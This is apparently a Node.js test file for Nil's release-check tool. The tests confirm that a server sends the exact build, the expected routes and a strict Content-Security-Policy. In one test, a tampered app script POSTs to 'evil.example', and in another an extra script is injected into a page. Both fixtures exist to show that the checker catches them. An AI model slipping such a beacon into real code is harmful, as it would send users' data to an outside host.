import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import express from 'express';
import serveWebApp from '../lib/serveWebApp.js';
import securityHeaders from '../security/securityHeaders.js';
import buildManifest from '../../scripts/release/buildManifest.mjs';
import cspProblems from '../../scripts/release/cspProblems.mjs';
import verifyServer from '../../scripts/release/verifyServer.mjs';

// The release check people run against a server: it has to pass a server sending the exact
// build, and catch every way a server could send something else, one byte, one route or a
// looser policy at a time.
const UA = 'release-check-test';
const BUILD = {
  'index.html': '<!doctype html><title>Nil</title><script type="module" src="/assets/app-1a2b.js"></script>',
  'assets/app-1a2b.js': 'console.log("nil")',
  'sw.js': 'self.addEventListener("fetch", () => {})',
  'build.json': '{"id":"abc"}\n',
};
const servers = [];
let dist;

function writeBuild(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nil-release-'));
  for (const [name, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    fs.writeFileSync(path.join(dir, name), text);
  }
  return dir;
}

// A server like Nil's own, with room for a route that misbehaves first.
async function serve(dir, { headers = true, before: tamper } = {}) {
  const app = express();
  if (headers) app.use(securityHeaders);
  if (tamper) tamper(app);
  serveWebApp(app, dir);
  const server = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  servers.push(server);
  return `http://127.0.0.1:${server.address().port}`;
}

const check = (base) => verifyServer({ base, files: buildManifest(dist, '3.0.0').files, userAgent: UA });

before(() => {
  dist = writeBuild(BUILD);
});
after(() => {
  for (const server of servers) server.close();
});

test('the same build always gives the same manifest bytes and release hash', () => {
  const again = writeBuild(BUILD);
  const a = buildManifest(dist, '3.0.0');
  const b = buildManifest(again, '3.0.0');
  assert.equal(a.text, b.text);
  assert.equal(a.hash, b.hash);
  assert.ok(a.text.endsWith('}\n'));
  assert.deepEqual(Object.keys(JSON.parse(a.text).files), ['/assets/app-1a2b.js', '/build.json', '/index.html', '/sw.js']);
  fs.appendFileSync(path.join(again, 'sw.js'), ' ');
  assert.notEqual(buildManifest(again, '3.0.0').hash, a.hash, 'one changed byte changes the release hash');
});

test('a server sending the exact build passes, routes and policy included', async () => {
  const report = await check(await serve(dist));
  assert.deepEqual(report.problems, []);
  assert.equal(report.files, 4);
  assert.equal(report.checked, report.files + report.routes);
});

test('one changed file is named, with what came back', async () => {
  const changed = writeBuild({ ...BUILD, 'assets/app-1a2b.js': 'console.log("nil"); fetch("https://evil.example", { method: "POST" })' });
  const report = await check(await serve(changed));
  assert.equal(report.problems.length, 1);
  assert.match(report.problems[0], /^\/assets\/app-1a2b\.js is different/);
});

test('a missing file and an extra script on a single route are both caught', async () => {
  const gone = writeBuild(BUILD);
  fs.rmSync(path.join(gone, 'sw.js'));
  const evilPage = BUILD['index.html'].replace('</title>', '</title><script src="/x.js"></script>');
  const base = await serve(gone, { before: (app) => app.get('/votes', (req, res) => res.type('html').send(evilPage)) });
  const report = await check(base);
  assert.ok(report.problems.some((p) => p.startsWith('/sw.js answered')), report.problems.join('\n'));
  assert.ok(report.problems.some((p) => p.startsWith('/votes is different')), report.problems.join('\n'));
});

test('a server without Nil’s policy fails even when every file matches', async () => {
  const report = await check(await serve(dist, { headers: false }));
  assert.deepEqual(report.problems, ['No Content-Security-Policy header, so the page could run scripts from anywhere.']);
});

test('the policy check accepts Nil’s own policy and refuses anything looser', () => {
  const nil = "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; base-uri 'none'";
  assert.deepEqual(cspProblems(nil), []);
  assert.equal(cspProblems(nil.replace("'wasm-unsafe-eval'", "'wasm-unsafe-eval' https://cdn.example")).length, 1);
  assert.equal(cspProblems(nil.replace("'wasm-unsafe-eval'", "'unsafe-eval'")).length, 1);
  assert.equal(cspProblems(nil.replace("; base-uri 'none'", '')).length, 1);
  // a second policy can only tighten what the browser allows, so it doesn't count against
  assert.deepEqual(cspProblems(`${nil}, script-src 'none'`), []);
});
